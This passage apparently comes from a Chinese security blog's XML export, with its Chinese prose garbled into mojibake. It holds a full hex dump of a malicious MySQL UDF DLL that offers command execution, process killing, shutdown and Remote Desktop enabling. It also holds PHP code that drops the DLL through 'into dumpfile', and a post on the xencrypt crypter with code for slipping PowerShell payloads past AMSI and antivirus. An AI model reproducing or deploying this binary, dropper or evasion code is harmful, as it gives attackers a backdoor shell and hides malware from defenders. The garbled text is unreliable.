8D4DF8895E04C74614010000008975FCFF15B8400010391D346000107513893534600010891EA134600010895DFC895808FF05386000108D4DF8FF15BC400010395DFC7409FF75FCE8C0040000598B35346000106A18E8C9040000897004895814894704895F0C5989008B47045F5E8940085BC9C3558BEC5356576A188BD9E8A00400008B7510FF75148BF883671400897704A1346000108907A1346000108947088D470C50E812F9FFFF83C40CFF430C3B730474258B450C3B0534600010751A8B45148B003B460C7C10897E088B43043B7008751C897808EB17893E8B43043BF075088978048B4304EBEA3B30750289388B43043B78048BF70F84B00000008B4604837814000F85A30000008B50048B0A3BC175598B4A0883791400751E8B560433C0408942148941148B46048B4004836014008B46048B7004EB673B7008750A8BF0568BCBE8D9FAFFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE8A0F7FFFFEB358379140074AA3B30750A8BF0568BCBE88AF7FFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE881FAFFFF8B43043B70040F8550FFFFFF8B43048B4004C74014010000008B450889385F5E5B5DC21000558BEC51568BF18B46048B0850518D45FC508BCEE857FDFFFFFF7604E8230300008366040083660C00598D4DFC33F6FF15B8400010FF0D38600010750D8B3534600010832534600010008D4DFCFF15BC40001085F6740756E8E7020000595EC9C3558BEC515356578BF98B47048B70048BD8A1346000103BF0B201741C8B4D0C8B093B4E0C8BDE0F9CC284D274048B36EB038B76083BF075E9807F08007405FF750CEB2684D28BCB894DFC74128B47043B1874EB8D4DFCE8CEF6FFFF8B4DFC8B510C8B450C3B107D195053568D450C508BCFE8D5FDFFFF8B088B4508C6400401EB078B4508C64004005F5E89085BC9C20800568BF18D461450FF15704000108D4E045EE9F8FEFFFF558BEC515153568BF18D461457508945F8FF15784000108D4508508D45FC8D5E04508BCBE8B6FCFFFF8B7DFC3B7E0874198B471085C074068B0850FF5108578D4508508BCBE8B1F9FFFFFF75F8FF15744000105F5E5BC9C20400558BEC5151FF750C8D45F850E8EEFEFFFF8B45088B4DF889088A4DFC884804C9C20800568BF18D4E04C6410800E88DFCFFFF8326008D461450FF157C4000108BC65EC3558BEC83EC108B45088B008365FC008945F88D45F8508D45F050E89EFFFFFF8B0083C010C9C20400558BEC518B4518568B75148326008308FF837D0C00894DFC750CA1146000108906E94A010000538B1DCC400010578B7D1068784A0010FF37FFD385C059590F842301000068744A0010FF37FFD385C059590F8410010000E8E2F6FFFF8BF085F6750E8B4514C700644A0010E9FE00000068604A0010FF37FFD385C0595975158D46085057FF750CE809E4FFFF83C40CE99700000068584A0010FF37FFD385C05959750F8D46085057FF750CE84AE4FFFFEBDA684C4A0010FF37FFD385C05959750F57FF750C8D460850E892EDFFFFEBBC68484A0010FF37FFD385C05959750F57FF750C8D460850E850E7FFFFEB9E68404A0010FF37FFD385C05959750F57FF750C8D460850E8FFF1FFFFEB808D7E088B0768284A001057FF50088B0759596AFFFF35146000108BCFFF50048BCEE88BF3FFFF8B4D1489018BCEE8E8F3FFFF8B5DFC8B4D188D7B14578901FF15784000108D4508508D4B04E87CFEFFFF578930FF1574400010EB07A11460001089065F5B33C05EC9C21400FF742404E80200000059C3FF2500410010FF25F4400010FF25F0400010FF25E8400010CCCCCCCCCCCCCCCCCCCC513D001000008D4C2408721481E9001000002D0010000085013D0010000073EC2BC88BC485018BE18B088B400450C3CCFF25C4400010CCCCCCCCCCCCCCCCCCCC6AFF5064A100000000508B44240C64892500000000896C240C8D6C240C50C3CCFF25E0400010FF25DC400010FF25D04000108B44240885C0750E39053C6000107E2EFF0D3C6000108B0D1041001083F8018B09890D40600010753F6880000000FF150841001085C059A348600010750433C0EB66832000A14860001068046000106800600010A344600010E8EA000000FF053C6000105959EB3D85C07539A14860001085C074308B0D44600010568D71FC3BF072128B0E85C97407FFD1A14860001083EE04EBEA50FF150041001083254860001000595E6A0158C20C00558BEC538B5D08568B750C578B7D1085F67509833D3C60001000EB2683FE01740583FE027522A14C60001085C07409575653FFD085C0740C575653E815FFFFFF85C0750433C0EB4E575653E80BE4FFFF83FE0189450C750C85C07537575053E8F1FEFFFF85F6740583FE037526575653E8E0FEFFFF85C0750321450C837D0C007411A14C60001085C07408575653FFD089450C8B450C5F5E5B5DC20C00FF25C8400010FF2524410010FF2518410010FF251C410010FF2520410010FF2538410010FF253C410010FF25344100108D4DDCE9C2E1FFFFB8884A0010E934FEFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000000000000636D642E657865202F6320257300000055736167653A636D6420226E65742075736572220D0A0D0A0000000055736167653A6578656320226E65742075736572220D0A0D0A000000CB120010000000000D0A7073202D6C0920C1D0B3F6CBF9D3D0BDF8B3CC0D0A7073202D6D73206E616D650920C1D0B3F6BCD3D4D8C1CBD6B8B6A8C4A3BFE9C3FBB5C4BDF8B3CC0D0A7073202D6D70207069640920C1D0B3F6D6B8B6A8BDF8B3CCB5C4CBF9D3D0C4A3BFE90D0A7073202D6B70207069640920B9D8B1D5D2BBB8F6BDF8B3CC0D0A7073202D6B6E206E616D650920B9D8B1D5CBF9D3D0D6B8B6A8B5C4BDF8B3CCC3FB0D0A0000002573093C3078252E38583E0D0A0000004D6F64756C65506174680942617365416464726573730D0A0000000025640925735C25730925730D0A000000456E756D50726F6365737365732829206572726F722E0D0A000000005365446562756750726976696C656765000000007073202D6B6E206E616D650D0A7073202D6B70207069640D0A0000007073202D6D73206E616D650D0A7073202D6D70207069640D0A00000052746C41646A75737450726976696C65676500005A7753687574646F776E53797374656D000000004E54444C4C2E444C4C0000004661696C656420546F2053687574646F776E00004661696C656420546F205265626F6F74000000004661696C656420546F204C6F676F66660000000049732054616B696E6720506C6163652E2E2E2E2E2E0D0A00536553687574646F776E50726976696C656765000000000055534147453A0D0A20202020202073687574646F776E205B202D30313233345D0D0A2020202020202D30202020206C6F676F66662E0D0A2020202020202D31202020207265626F6F742E0D0A2020202020202D3220202020706F7765726F66662E0D0A2020202020202D33202020207375706572207265626F6F742E0D0A2020202020202D342020202073757065722073687574646F776E2E0D0A6578616D706C653A0D0A20202020202073687574646F776E202D330D0A0000000077696E7374612E646C6C000057696E53746174696F6E5265736574005554494C444C4C2E646C6C00537472436F6E6E656374537461746500252D3131642020252D3133732020252D3133732020252D3133732020252D313573202025730D0A00202020200000000025642E25642E25642E25640053657373696F6E49442020202053657373696F6E4E616D6520202020557365724E616D6520202020202020436C69656E744E616D6520202020202020495020202020202020202020202020202053746174650D0A00000000456E756D6572617465205465726D696E616C2053657373696F6E73204661696C65642E2025640D0A000000004661696C20546F20536574204E6577205465726D696E616C205365727669636520506F72740D0A00546865205465726D696E616C205365727669636520506F727420486173204265656E2053657420546F2025640D0A00000000000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D54637000000000506F72744E756D62657200006644656E795453436F6E6E656374696F6E73000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C20536572766572000000005453456E61626C656400000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D5365727669636500000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D44440000000053746172740000005465726D696E616C2053657276696365205374617475733A2025730D0A00000044697361626C656400000000456E61626C6564005265674F70656E4B65794578204572726F722E0D0A0000005465726D696E616C205365727669636520506F72743A2025640D0A00536574204E6577205465726D696E616C2053657276696365204661696C65640D0A000000536574205465726D696E616C20536572766963652044697361626C65640D0A00536574205465726D696E616C205365727669636520456E61626C65642E0D0A006C6F676F666600007175657279000000766965770000000064697361626C6500656E61626C65000070000000000000004445534352495054494F4E3A0D0A202020202020202020202020436F6E666967205465726D696E616C205365727669636520537570706F72747320323030302F78702F323030332E0D0A55534147453A0D0A2020202020207465726D737663202D656E61626C65202D64697361626C65202D76696577202D70203C6E6577706F72743E202D7175657279202D6C6F676F6666203C73657373696F6E2069643E0D0A2020202020202D656E61626C6520202020456E61626C65205465726D696E616C20536572766963652E0D0A2020202020202D64697361626C6520202044697361626C65205465726D696E616C20536572766963652E0D0A2020202020202D7669657720202020202056696577205465726D696E616C20536572766963652053657474696E67732E0D0A2020202020202D70202020202020202020536574204E6577205465726D696E616C205365727669636520506F72742E0D0A6578616D706C653A0D0A2020202020207465726D737663202D71756572790D0A2020202020207465726D737663202D6C6F676F666620310D0A2020202020207465726D737663202D656E61626C65202D7020333339390D0A2020202020207465726D737663202D7020333339390D0A2020202020207465726D737663202D766965770D0A0099210010D1210010E22100100C2200100000000000000000C000000000000046762F0010762F0010762F0010F7230010D5240010F723001099210010D1210010E22100102D2400102E4F4350000000000D0A68656C700D0A436D6420202020202020202D3E0D0A45786563202020202020202D3E0D0A53687574646F776E2020203D3E0D0A70732020202020202020203D3E0D0A5465726D537663202020203D3E0D0A0D0A000000556E6B6E6F776E20436F6D6D616E642E3A28200D0A0D0A005465726D537663007073000073687574646F776E000000004578656300000000436D6400455F4F55544F464D454D4F52590000003F00000068656C7000000000FFFFFFFFFA3000102005931901000000804A0010000000000000000000000000000000008C4B00000000000000000000E24E000034400000844C00000000000000000000004F00002C410000584B00000000000000000000EE4F0000004000009C4C000000000000000000000E50000044410000104C000000000000000000004C500000B84000001C4C000000000000000000002E510000C4400000704C00000000000000000000AA510000184100008C4C00000000000000000000FA510000344100000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000071025365744C6173744572726F7200009E025465726D696E61746550726F6365737300001B00436C6F736548616E646C65001A014765744C6173744572726F7200009602536C65657000DF02577269746546696C6500CE0257616974466F7253696E676C654F626A6563740018025265616446696C650000F9015065656B4E616D65645069706500440043726561746550726F63657373410000500147657453746172747570496E666F41004300437265617465506970650000F70047657443757272656E7450726F63657373006D014765745469636B436F756E740000EF014F70656E50726F63657373003E0147657450726F63416464726573730000C2014C6F61644C696272617279410000D2025769646543686172546F4D756C74694279746500B001496E7465726C6F636B6564496E6372656D656E740000AD01496E7465726C6F636B656444656372656D656E740000D6014D6170566965774F6646696C6500350043726561746546696C654D617070696E67410000B002556E6D6170566965774F6646696C6500120147657446696C6553697A6500570044656C65746546696C654100340043726561746546696C654100630147657454656D7046696C654E616D65410000650147657454656D7050617468410000550044656C657465437269746963616C53656374696F6E00C1014C65617665437269746963616C53656374696F6E00006600456E746572437269746963616C53656374696F6E0000AA01496E697469616C697A65437269746963616C53656374696F6E004B45524E454C33322E646C6C0000D3004578697457696E646F77734578005553455233322E646C6C0000170041646A757374546F6B656E50726976696C6567657300F5004C6F6F6B757050726976696C65676556616C7565410042014F70656E50726F63657373546F6B656E0000EF004C6F6F6B75704163636F756E745369644100D000476574546F6B656E496E666F726D6174696F6E005B01526567436C6F73654B6579007B01526567517565727956616C7565457841000072015265674F70656E4B657945784100860152656753657456616C75654578410000640152656744656C65746556616C7565410071015265674F70656E4B657941005E015265674372656174654B6579410041445641504933322E646C6C00002E00436F496E697469616C697A65457800006F6C6533322E646C6C000B013F3F315F4C6F636B697440737464404051414540585A0000A2003F3F305F4C6F636B697440737464404051414540585A00004D5356435036302E646C6C005753325F33322E646C6C00003D0261746F6900005E02667265650000B202737072696E74660091026D616C6C6F63000059015F6D6273636D70005F015F6D627369636D700000BE027374726C656E00000F003F3F3240594150415849405A0000C502737472737472000099026D656D7365740000E6027763736C656E000049005F5F4378784672616D6548616E646C65720096026D656D636D70000092015F7075726563616C6C00AD027365746C6F63616C6500DC0276737072696E74660000BA027374726370790000C1015F73747269636D7000004D53564352542E646C6C00000F015F696E69747465726D009D005F61646A7573745F6664697600000C004765744D6F64756C65426173654E616D654100000E004765744D6F64756C6546696C654E616D6545784100000400456E756D50726F636573734D6F64756C657300000500456E756D50726F6365737365730050534150492E444C4C000800575453467265654D656D6F7279000C00575453517565727953657373696F6E496E666F726D6174696F6E41000600575453456E756D657261746553657373696F6E73410057545341504933322E646C6C000057494E494E45542E646C6C0000000000000000000000000000000000BFC7514B00000000665200000100000003000000030000004852000054520000605200003314000020140000F4130000725200007852000085520000000001000200546573745544462E646C6C007368656C6C007368656C6C5F6465696E6974007368656C6C5F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000D0490010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000140100000F30163039304E305D307330C430F630043110313F3166317C319C31A531BD31F6310F3231323B3242325A327432B332C632D532193336338733A433F833013407340D34293439349634B234C334DB34033510356D357E359D351436CD36D436DC360137373723383238623874389D38B8382B3969398D39AF39E839013A113A403A483A5D3A713A803ACE3ADF3AE53AF33AF83A063B403B503B693B723B823B8B3B9B3BA43BE43B033C123C1B3C203C263C2D3C343C4A3C533C583C5E3C653C6C3CA53CAB3CC43C333D443D683D6F3D7C3D833D9F3DFC3D013E1E3E2C3E4F3E553E803E9E3EA33EC63EEF3EF63E023F203F403F573F603F713F813F8C3F963FBF3FC53FDC3FF63FFF3F000000200000F0000000283051305830653076308E30B230D230E130F53012312C3146315D317231A431DB31EE3116323C32533268328532A832B332BE32D432F43245336D33B633BB33C233C933CF33143456345D34663475349E34A4341935413555358435AE35C335D5350C36473675369336BC36EE368B37B637F0383739E839EE39F639FD39093A123A263A6A3A713A913AD03BD63BDE3BE43BEE3B123C9A3CBA3CF63C3C3D873D953D9E3DB13DD33DDD3D013E1F3E3D3E5B3E7E3E8E3EB83ECD3ED43EF03EF63EFC3E023F423F723F783F7E3F8C3F943F9A3FA53FB23FBA3FC83FCD3FD23FD73FE23FEF3FF93F000000300000280000000E301A30203042305430B030CC30D230D830DE30E430EA30F030F63003310000004000002C00000098318039843988398C39A039A439A839AC39B039B439B839BC39C039C439843A903A0000006000000C00000014300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,CHAR))&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;select c from udftmp into dumpfile &quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error(). <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) !=<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Dump DLL Failed.&#x27;</span>.mysql_error();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Dump DLL Success!&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote>
<p>æ³¨å…¥äº§ç”ŸåŸå› å°±æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœªè¿›è¡Œä¸¥æ ¼æ ¡éªŒï¼Œå¯¼è‡´å¯ä»¥æ„é€ æ¶æ„è¯­å¥ã€‚</p>
</blockquote>
<blockquote>
<p>æœ¬ç¯‡æ–‡ç« ä»…ä»…ä»‹ç»MYSQLçš„åŸºç¡€ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>æ¼æ´</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShellå…æ€å·¥å…· xencrypt</title>
    <url>/posts/bbc4e121/</url>
    <content><![CDATA[<p>åœ¨å¾®ä¿¡å·<code>æ´›ç±³å”¯ç†Š</code>çœ‹åˆ°å‘äº†ä¸€ç¯‡æ–‡ç« ï¼Œå…³äºå…æ€çš„ï¼Œäºæ˜¯æµ‹è¯•äº†ä¸€ä¸‹ã€‚éå¸¸Niceã€‚</p>
<a id="more"></a>

<h1 id="PowerShellå…æ€å·¥å…·-xencrypt"><a href="#PowerShellå…æ€å·¥å…·-xencrypt" class="headerlink" title="PowerShellå…æ€å·¥å…· xencrypt"></a>PowerShellå…æ€å·¥å…· xencrypt</h1><p>åœ¨å¾®ä¿¡å·<code>æ´›ç±³å”¯ç†Š</code>çœ‹åˆ°å‘äº†ä¸€ç¯‡æ–‡ç« ï¼Œå…³äºå…æ€çš„ï¼Œäºæ˜¯æµ‹è¯•äº†ä¸€ä¸‹ã€‚</p>
<ul>
<li>åœ°å€ï¼š<ul>
<li>å…¬ä¼—å·ï¼š<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTG1yRU1sQTZ4VkxncldIUmYtY25JQQ==">https://mp.weixin.qq.com/s/LmrEMlA6xVLgrWHRf-cnIA<i class="fa fa-external-link-alt"></i></span></li>
<li>GIitHubï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZS14ZW50cm9weS94ZW5jcnlwdA==">https://github.com/the-xentropy/xencrypt<i class="fa fa-external-link-alt"></i></span></li>
<li>ä½œè€…ï¼š<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMuZXhwZXJ0LzIwMjAvMDIvMDYvd3JpdGUtYS1jcnlwdGVyLWluLWFueS1sYW5ndWFnZS5odG1s">https://netsec.expert/2020/02/06/write-a-crypter-in-any-language.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
</ul>
<h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><p>æµ‹è¯•æ–‡ä»¶ä¸ºsherklock.ps1ã€‚</p>
<h2 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h2><ul>
<li>ç»•è¿‡VirusTotalä¸Šä½¿ç”¨çš„AMSIå’Œæ‰€æœ‰ç°ä»£AVï¼ˆæˆªè‡³æ’°å†™æ—¶ï¼‰</li>
<li>å‹ç¼©å’ŒåŠ å¯†Powershellè„šæœ¬</li>
<li>å¼€é”€æå°ï¼Œè€Œä¸”é€šå¸¸ä¸ºè´Ÿï¼ˆç”±äºå‹ç¼©ï¼‰</li>
<li>éšæœºåŒ–å˜é‡åç§°ï¼Œä»¥è¿›ä¸€æ­¥æ¨¡ç³Šè§£å¯†ç¨‹åºå­˜æ ¹</li>
<li>éšæœºåŒ–åŠ å¯†ï¼Œå‹ç¼©ç”šè‡³è¯­å¥åœ¨ä»£ç ä¸­å‡ºç°çš„é¡ºåºï¼Œä»¥æœ€å¤§ç¨‹åº¦åœ°æé«˜ç†µï¼</li>
<li>è¶…çº§å®¹æ˜“ä¿®æ”¹ä»¥åˆ›å»ºè‡ªå·±çš„åŠ å¯†ç¨‹åºå˜ä½“</li>
<li>æ”¯æŒé€’å½’åˆ†å±‚ï¼ˆåŠ å¯†å™¨å¯¹åŠ å¯†çš„è¾“å‡ºè¿›è¡ŒåŠ å¯†ï¼‰ï¼Œæœ€å¤šæµ‹è¯•500å±‚ã€‚</li>
<li>åªè¦è¾“å…¥è„šæœ¬ä¹Ÿæ”¯æŒImport-Moduleä»¥åŠæ ‡å‡†è¿è¡Œ</li>
<li>GPLv3-å…è´¹å’Œå¼€æºï¼</li>
<li>æ‰€æœ‰åŠŸèƒ½éƒ½åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå› æ­¤æ‚¨å¯ä»¥éšèº«æºå¸¦å®ƒï¼</li>
<li>å°½ç®¡ä¸Šè¿°æ‰€æœ‰å†…å®¹éƒ½ä¸æ˜¯æ¯ç§é…ç½®çš„çµä¸¹å¦™è¯-è­¦å‘Šè´­ä¹°è€…ï¼</li>
</ul>
<p>è°·æ­Œç¿»è¯‘è€Œæ¥ã€‚ã€‚ã€‚</p>
<h2 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h2><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>ä½¿ç”¨AESï¼Œä½†æ˜¯æˆ‘ä¹‹æ‰€ä»¥é€‰æ‹©å®ƒï¼Œå¹¶ä¸æ˜¯å› ä¸ºAESåœ¨åŠ å¯†æ–¹é¢æ¯”å…¶ä»–æ–¹æ³•æ›´å¥½ï¼Œè€Œæ˜¯å› ä¸ºPowerShellæä¾›äº†ä¸€ç§éå¸¸ç®€å•çš„æ–¹æ³•æ¥è°ƒç”¨.NETå‡½æ•°ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$aes</span>.BlockSize = <span class="number">128</span></span><br><span class="line"><span class="variable">$aes</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::ECB</span><br><span class="line"><span class="variable">$aes</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line"><span class="variable">$aes</span>.KeySize = <span class="number">128</span></span><br><span class="line"><span class="variable">$aes</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$aes</span>.IV = <span class="variable">$payload</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line"><span class="variable">$memstream</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream(,<span class="variable">$aes</span>.CreateDecryptor().TransformFinalBlock(<span class="variable">$payload</span>,<span class="number">16</span>,<span class="variable">$payload</span>.Length<span class="literal">-16</span>))</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä¹‹æ‰€ä»¥é€‰æ‹©è¿™ç§æ–¹æ³•ï¼Œæ˜¯å› ä¸ºé˜²ç—…æ¯’è½¯ä»¶æ£€æµ‹æ¶æ„è½¯ä»¶çš„ä¸»è¦æ–¹æ³•ä¹‹ä¸€æ˜¯é€šè¿‡é™æ€è§„åˆ™ã€‚ä»–ä»¬æŒ‘é€‰å‡ºæ–‡ä»¶ä¸­çš„å­—èŠ‚åºåˆ—æˆ–å­—ç¬¦ä¸²ï¼Œå¹¶åˆ¶å®šåˆå¹¶çš„è§„åˆ™ï¼Œå¾ˆå¥½åœ°è¡¨æ˜æ–‡ä»¶æ˜¯ä¸€ç§ç‰¹å®šç±»å‹çš„æ¶æ„è½¯ä»¶ã€‚é€šè¿‡ä½¿ç”¨æ ‡å‡†çš„APIè°ƒç”¨è€Œä¸åšä»»ä½•è‡ªå®šä¹‰æ“ä½œï¼Œé’ˆå¯¹æ­¤åŠ å¯†å™¨çš„è§„åˆ™å°†ä¸å¾—ä¸ä¾é æ ‡è®°æ™®é€šçš„APIè°ƒç”¨ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¤§é‡è¯¯æŠ¥ï¼Œå¹¶ä¸”åˆ†æäººå‘˜ä¼¼ä¹æ ¹æ®æˆ‘çš„ç ”ç©¶è¯•å›¾é¿å…è¿™ç§æƒ…å†µã€‚åœ¨è¿™é‡Œï¼Œå¦‚ä½•é€‰æ‹©ç®—æ³•å°šæ— ç¡®å®šçš„â€œç§‘å­¦â€ï¼Œå› æ­¤è¯·æŒ‰ç…§è‡ªå·±çš„é€»è¾‘å’Œæƒ³æ³•è¡Œäº‹ï¼Œä½†æ˜¯è¿™ç§æ€è·¯ç›®å‰å¯¹æˆ‘è€Œè¨€ä»ç„¶æœ‰æ„ä¹‰ï¼Œå› æ­¤è¿™æ˜¯æˆ‘çš„é€‰æ‹©ã€‚</p>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¦‚æœæ‚¨å¯¹éå¸¸å…·ä½“çš„åŠ å¯†å’Œè§£å¯†ç®—æ³•è¿›è¡Œç¡¬ç¼–ç ï¼Œåˆ™å¾ˆå¯èƒ½ä»…é€šè¿‡å°†ç‰¹å®šçš„åŠ å¯†å’Œè§£å¯†ä¾‹ç¨‹æ ‡è®°ä¸ºå­˜æ ¹çš„â€œç­¾åâ€ï¼Œä»–ä»¬å°±èƒ½è·å¾—éå¸¸ä½çš„è¯¯æŠ¥ç‡ã€‚è¿™æ˜¯ä¸€ç§éå¸¸æ‡’æƒ°çš„æ–¹å¼ï¼Œä½†æ˜¯å®ƒå¯ä»¥å·¥ä½œå¹¶ä¸”å¯¹ç‰¹å®šç‰ˆæœ¬çš„æ¶æ„è½¯ä»¶éå¸¸æœ‰æ•ˆã€‚å…‹æœæ­¤é™åˆ¶çš„ä¸€ç§æ–¹æ³•æ˜¯åŠ¨æ€ç”ŸæˆåŠ å¯†å’Œè§£å¯†ç®—æ³•ï¼Œæˆ–è€…è‡³å°‘æ‰‹åŠ¨æ›´æ”¹å®ƒï¼Œä½†è¿™è¶…å‡ºäº†æœ¬æ–‡çš„èŒƒå›´ã€‚</p>
